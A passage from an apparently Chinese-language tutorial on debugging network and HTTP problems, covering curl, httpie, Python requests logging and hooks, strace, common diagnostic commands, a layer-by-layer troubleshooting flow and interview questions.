# 显示详细时间统计（调试超时/慢请求）
curl -w "\\n\\n=== 时间统计 ===\\nDNS解析: %{time_namelookup}s\\nTCP连接: %{time_connect}s\\nTLS握手: %{time_appconnect}s\\n首字节: %{time_starttransfer}s\\n总耗时: %{time_total}s\\n" \\
  -o /dev/null -s https://example.com

# 只显示响应头
curl -I https://example.com
\`\`\`

### 5.2 httpie：更友好的命令行HTTP客户端

httpie是更现代、对人类更友好的命令行HTTP客户端，输出带语法高亮：

\`\`\`bash
# 安装
pip install httpie

# GET请求
http example.com

# POST JSON（自动序列化）
http POST example.com/api/login username=test password=123456

# 带头部
http example.com Authorization:"Bearer token"

# 表单提交
http -f POST example.com/form name=test age=18

# 详细输出
http -v example.com
\`\`\`

## 六、Python层面的调试

### 6.1 requests库调试

开启requests的debug日志，查看详细的HTTP请求响应：

\`\`\`python
import requests
import logging
import http.client

# 方法1：开启HTTPConnection debug级别
http.client.HTTPConnection.debuglevel = 1

# 配置logging显示debug日志
logging.basicConfig(level=logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True

# 发请求，会打印所有请求响应头、数据
resp = requests.get('https://example.com')
\`\`\`

### 6.2 更强大的方法：requests钩子+打印原始数据

\`\`\`python
import requests

def debug_request(response, *args, **kwargs):
    """requests响应钩子，打印请求和响应详情"""
    print('\\n' + '='*60)
    print('=== 请求 ===')
    req = response.request
    print(f'{req.method} {req.url}')
    for k, v in req.headers.items():
        print(f'{k}: {v}')
    if req.body:
        print(f'\\n{req.body}')
    
    print('\\n=== 响应 ===')
    print(f'HTTP {response.status_code} {response.reason}')
    for k, v in response.headers.items():
        print(f'{k}: {v}')
    print(f'\\n{response.text[:1000]}')  # 最多显示前1000字符
    print('='*60 + '\\n')

# 创建session挂载钩子
session = requests.Session()
session.hooks['response'] = [debug_request]

resp = session.get('https://example.com')
\`\`\`

### 6.3 Python自带pdb调试

在关键位置加断点检查：

\`\`\`python
import pdb

def handle_request(request):
    pdb.set_trace()  # 运行到这里暂停，进入调试器
    # 在pdb中可以：
    # p request.headers  打印变量
    # n 单步执行
    # s 进入函数
    # c 继续运行
    # l 显示代码
    return response
\`\`\`

## 七、strace：追踪系统调用

当你不知道程序卡在哪里时，strace可以追踪程序的所有系统调用，看它卡在哪一步：

\`\`\`bash
# 追踪Python进程的网络相关系统调用
strace -p <PID> -e network,read,write,connect,accept

# 启动程序并追踪
strace -f -e network python myserver.py

# 统计系统调用耗时，找慢在哪里
strace -c -p <PID>

# 追踪TCP连接
strace -e connect,accept,sendto,recvfrom -p <PID>
\`\`\`

输出示例：
\`\`\`
connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 EINPROGRESS (Operation now in progress)
# 可以看到连接到哪个IP的哪个端口，是阻塞还是失败
\`\`\`

类似工具：
- macOS：\`dtruss\`（替代strace）、\`fs_usage\`、\`nettop\`
- Linux：\`ss\`（查看socket状态，比netstat快）、\`lsof -i :端口\`（哪个进程占用端口）、\`tcpdump\`

## 八、常用诊断命令速查

| 目的 | 命令 |
|------|------|
| 检查端口是否监听 | \`netstat -tlnp\` 或 \`ss -tlnp\` |
| 查看哪个进程占用端口 | \`lsof -i :8080\` |
| 测试端口是否通 | \`telnet host port\` 或 \`nc -zv host port\` |
| DNS查询 | \`nslookup example.com\` 或 \`dig example.com\` |
| 路由追踪 | \`traceroute example.com\`(Linux)/\`traceroute example.com\`(macOS) |
| 查看本机路由表 | \`ip route\` 或 \`netstat -rn\` |
| 查看防火墙规则 | \`iptables -L -n\`(Linux) |
| 查看网络连接统计 | \`netstat -s\` 或 \`ss -s\` |
| 查看当前TCP连接状态 | \`netstat -antp\` 或 \`ss -antp\` |
| 测试HTTP响应头 | \`curl -I https://example.com\` |
| 查看DNS缓存 | macOS: \`sudo dscacheutil -flushcache\`; Linux: \`systemd-resolve --statistics\` |

## 九、排查网络问题的思路

当遇到网络问题时，按照OSI七层模型从下到上逐层排查：

| 层级 | 排查内容 | 工具 |
|------|---------|------|
| 1. 物理层/链路层 | 网线是否插好、WiFi是否连接、网卡是否up | \`ip link\`/\`ifconfig\` |
| 2. 网络层 | IP是否配置正确、是否能ping通网关、是否能ping通公网IP | \`ip addr\`, \`ping\` |
| 3. 传输层 | 端口是否开放、TCP连接能否建立、是否有防火墙 | \`telnet/nc\`, \`ss\`, \`iptables\` |
| 4. 应用层 | HTTP请求是否正确、协议是否匹配、TLS证书是否有效 | \`curl\`, \`tcpdump\` |

**典型排查流程：**
1. \`ping 127.0.0.1\` → 确认TCP/IP协议栈正常
2. \`ping <本机IP>\` → 确认网卡正常
3. \`ping <网关IP>\` → 确认本地网络正常
4. \`ping 8.8.8.8\` → 确认能上网
5. \`ping example.com\` → 确认DNS正常
6. \`telnet example.com 80\` → 确认TCP端口能连接
7. \`curl -v http://example.com\` → 确认HTTP层正常

## 十、requests库源码阅读建议

理解requests库的实现能极大提升HTTP编程能力。阅读源码时重点关注：

1. **请求如何构造**：\`PreparedRequest\`类如何把参数组装成实际发送的字节流
2. **会话管理**：\`Session\`类如何复用连接、管理Cookie池
3. **适配器机制**：\`HTTPAdapter\`如何封装urllib3，实现连接池
4. **响应解析**：如何从字节流解析出Response对象、处理编码、解压
5. **重试与重定向**：如何自动处理3xx跳转、连接失败重试

**核心模块结构：**
\`\`\`
requests/
├── api.py          # 对外API：get/post/put/delete等
├── sessions.py     # Session类，核心会话管理
├── models.py       # Request/Response数据模型
├── adapters.py     # HTTPAdapter，基于urllib3
├── cookies.py      # Cookie处理
└── structures.py   # 大小写不敏感字典等数据结构
\`\`\`

## 十一、常见坑点

### 坑点1：tcpdump抓不到loopback流量
使用\`-i lo\`或\`-i any\`，loopback接口的流量不会出现在eth0上。

### 坑点2：Wireshark看不到接口（macOS）
macOS下需要给Wireshark授权，或者先运行\`sudo chmod +r /dev/bpf*\`。

### 坑点3：curl -d 默认是POST，Content-Type是application/x-www-form-urlencoded
发送JSON需要手动加\`-H "Content-Type: application/json"\`。

### 坑点4：strace看不到Python进程的系统调用
多线程程序要加\`-f\`参数追踪所有线程，否则只追踪主线程。

### 坑点5：生产环境debug日志泄露敏感信息
开启HTTP debug日志会打印Authorization头、Cookie等敏感信息，生产环境要关闭！

## 十二、面试常见问题

**Q: 你平时调试网络问题用什么工具？流程是怎样的？**
A: 先用curl -v快速测试看哪一步出错，客户端问题看浏览器开发者工具Network面板，服务器端用tcpdump抓包确认收到了什么数据，复杂场景保存pcap用Wireshark分析；进程卡住用strace看卡在哪一个系统调用；端口问题用lsof/ss检查。排查顺序从下到上：网络层→传输层→应用层。

**Q: 如何在不使用浏览器开发者工具的情况下查看完整的HTTP请求和响应？**
A: 1）用curl -v命令行；2）用mitmproxy/Charles代理查看；3）用tcpdump/Wireshark抓包；4）代码层面用requests钩子或logging打印；5）用nc -l监听端口查看收到的原始请求。

**Q: HTTPS流量Wireshark为什么看到的是乱码？怎么解密？**
A: 因为TLS加密了。解密方法：1）设置SSLKEYLOGFILE环境变量，浏览器会导出会话密钥，Wireshark配置密钥文件即可解密；2）用Charles/mitmproxy作为中间人代理，安装它们的根证书，可以解密HTTPS。

**Q: 服务端没收到请求，如何排查是客户端没发出去还是中间网络丢了？**
A: 先在客户端tcpdump看有没有发SYN包，如果没有就是客户端问题；如果发了SYN没有收到SYN+ACK，中间网络/防火墙问题；如果收到了RST，说明端口没开/被拒绝；如果TCP连接建立了但服务端没收到应用层数据，检查是否是应用层问题（比如TLS握手失败、HTTP格式错误服务端忽略了）。
`,
  }
];